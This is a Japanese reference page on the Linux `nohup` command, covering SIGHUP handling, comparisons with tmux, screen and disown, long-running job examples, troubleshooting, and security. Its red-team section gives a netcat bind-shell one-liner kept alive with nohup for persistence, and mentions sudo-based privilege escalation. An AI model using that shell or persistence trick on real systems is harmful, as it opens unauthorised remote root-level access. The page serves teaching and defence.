# `nohup` - ログアウト後もコマンドを実行し続ける

## 概要

`nohup` (no hangup) は、コマンドを**ハングアップシグナル (SIGHUP)** を無視するようにして実行するコマンドです。通常、ユーザーがシェルからログアウトすると、そのシェルから起動されたプロセスにはSIGHUPシグナルが送られ、プロセスは終了します。`nohup` を使ってコマンドを実行すると、このシグナルをブロックするため、**SSHセッションを閉じたり、ターミナルを終了したりしても、そのコマンドはバックグラウンドで実行され続けます**。

`nohup` は、コマンドの標準出力と標準エラー出力を、デフォルトで `nohup.out` というファイルに追記（リダイレクト）します。

(出自: `coreutils` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| ⭐ **`screen` / `tmux`** | ターミナルセッション自体をサーバー上で永続化させる「ターミナルマルチプレクサ」。セッションのデタッチ/アタッチが可能で、複数のウィンドウも管理でき、遥かに高機能で柔軟です。 | `tmux` / `screen` |
| **`&` (アンパサンド)** | コマンドをバックグラウンドで実行しますが、SIGHUPシグナルはブロックしないため、ログアウトするとプロセスは終了します。**`nohup command &` のように、両者を組み合わせるのが一般的**です。 | - |
| **`disown`** | `bg` でバックグラウンドに送ったジョブを、シェルのジョブ管理から切り離し、SIGHUPシグナルが送られないようにします。`nohup` と似た結果を得られますが、`disown` はジョブを後から切り離す操作です。 | - |

## よく連携されるコマンド

`nohup` は、コマンドをバックグラウンドで実行させるための `&` 演算子とほぼ常に連携して使われます。

### シナリオ例: 時間のかかるスクリプトを安全に実行する (インフラ構築・運用視点)

* **目的**: 数時間かかるデータ移行スクリプトを実行し、ネットワークが不安定なSSHセッションを安全に閉じられるようにする。
* **連携コマンド**: `&`, `tail`
* **解説**: `nohup` と `&` を組み合わせることで、コマンドはSIGHUPを無視し、かつバックグラウンドで実行されます。`tail -f` で出力ファイル (`nohup.out`など) を監視することで、進捗を確認できます。
* **コマンド例**:

    ```bash
    # 1. データ移行スクリプトを nohup と & を使ってバックグラウンドで実行
    #    出力は migration.log にリダイレクトする
    nohup ./data_migration.sh > migration.log 2>&1 &

    # 2. 実行開始のメッセージとPIDが表示される
    # [1] 12345

    # 3. tailで進捗を確認
    tail -f migration.log

    # 4. 確認後、SSHセッションを閉じてもスクリプトは実行され続ける
    ```

## オプション説明

`nohup` 自体にはオプションはほとんどありません。引数として実行したいコマンドを指定します。

| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐ `<command> [arg...]` | SIGHUPを無視して実行したいコマンドと、その引数を指定します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 時間のかかるバッチ処理やデータ移行スクリプトを実行し、SSHセッションを安全に閉じる。
* **組み合わせ**: `nohup <long_running_script>.sh &`
* **解説**: 数時間かかるデータベースのバックアップスクリプトや、機械学習の学習ジョブなどを実行する際に使用します。`tail -f nohup.out` で実行状況を時々確認できます。
* **例**:

    ```bash
    # 大規模なデータ移行スクリプトを実行し、ログアウトする
    nohup ./data_migration.sh > migration.log 2>&1 &
    ```

### 2. ブルーチーム視点

* **タスク**: `nohup` を使って実行されている不審なプロセスがないかを確認する。
* **組み合わせ**: `ps aux | grep nohup`
* **解説**: 正規のバッチ処理であることも多いですが、`/tmp` ディレクトリから実行されていたり、不審なユーザーによって実行されていたりする `nohup` プロセスは、攻撃者が設置した**永続的なバックドア**や**クリプトマイナー**である可能性を強く疑います。
* **例**:

    ```bash
    # nohup で実行されているプロセスを検索
    ps aux | grep "[n]ohup"
    ```

### 3. レッドチーム視点

* **タスク**: **永続化 (Persistence)** のため、リバースシェルのリスナーなどをログアウト後も維持する。
* **組み合わせ**: `nohup <payload> &`
* **解説**: 攻撃者は侵入後、リバースシェルなどを確立しますが、そのセッションが切断されるとシェルも失います。`nohup` を使うことで、一度確立した足がかり（バックドア）を、セッションが切れても失うことなく、永続的に維持しようとします。
* **例**:

    ```bash
    # Netcatを使ったバインドシェルを nohup で永続化
    nohup nc -lvnp 4444 -e /bin/sh &
    ```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **メッセージ**: `nohup: ignoring input and appending output to 'nohup.out'`
    * **考えられる原因**: これはエラーではなく、正常なメッセージです。`nohup` がターミナルからの入力を無視し、出力を `nohup.out` に追記モードで書き込み始めていることを示しています。
    * **解決策**: -

2. **現象**: **`nohup.out` が作成されない、または別の場所に作成される。**
    * **考えられる原因**: カレントディレクトリに書き込み権限がない場合、`nohup` はユーザーのホームディレクトリ (`$HOME/nohup.out`) にファイルを作成しようと試みます。
    * **解決策**: 出力ファイルの場所を確実に制御したい場合は、`nohup command > /path/to/logfile.log 2>&1 &` のように、明示的にリダイレクトを指定してください。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `nohup` 自体ではなく、それが**永続化**の手段として悪用されます。
* **悪用シナリオ**: `nohup` は、そのシンプルさから、攻撃者がシステム上で悪意のあるプロセス（バックドア、C2ビーコン、クリプトマイナーなど）を永続化させるための常套手段の1つです。

### GTFOBins / LOLBAS における利用例

* **機能**: **Sudo**, **Privilege Escalation**
* **解説**: もしユーザーが `sudo nohup` を実行できるが、`sudo /bin/sh` は直接実行できない、という特殊な `sudoers` 設定の場合、`nohup` を使って任意のコマンドをroot権限で実行できます。
* **参照**: `https://gtfobins.github.io/gtfobins/nohup/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 最小権限の原則に従い、不要なユーザーにシェルアクセスを許可しない。`sudoers` の設定を厳格にする。
* **Detection (検知)**: 実行中のプロセスを監視し、`nohup` によって起動された、親プロセスID (PPID) が 1 になっている不審なプロセスがないかを確認する。

## 注意点・補足

* **`tmux` / `screen` の利用を推奨**: `nohup` は手軽ですが、プロセスの管理（後から対話的に操作するなど）はできません。本格的な長時間タスクや、複数のプロセスを管理したい場合は、ターミナルセッション自体を永続化できる `tmux` や `screen` を使うのが現代的なベストプラクティスです。
